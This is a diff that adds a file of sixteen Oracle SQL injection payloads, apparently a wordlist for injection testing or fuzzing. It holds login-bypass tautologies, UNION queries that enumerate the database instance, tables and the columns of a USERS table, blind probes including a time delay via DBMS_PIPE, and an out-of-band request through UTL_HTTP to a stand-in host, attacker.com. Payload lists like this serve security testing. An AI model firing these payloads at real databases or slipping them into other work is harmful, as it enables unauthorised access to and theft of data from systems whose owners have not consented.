@@ -1,0 +1,16 @@
+'
+' OR '1'='1
+' OR '1'='1' --
+' OR 1=1 --
+' UNION SELECT NULL FROM DUAL --
+' UNION SELECT NULL,NULL FROM DUAL --
+' UNION SELECT NULL,NULL,NULL FROM DUAL --
+' UNION SELECT global_name,instance_name,version FROM v$instance --
+' UNION SELECT table_name,NULL FROM all_tables --
+' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS' --
+' AND 1=1 --
+' AND 1=2 --
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) --
+' AND (SELECT COUNT(*) FROM all_users WHERE username='SYS') > 0 --
+' AND (SELECT UTL_INADDR.get_host_name('127.0.0.1') FROM DUAL) IS NOT NULL --
+' AND UTL_HTTP.request('http://attacker.com') IS NULL --
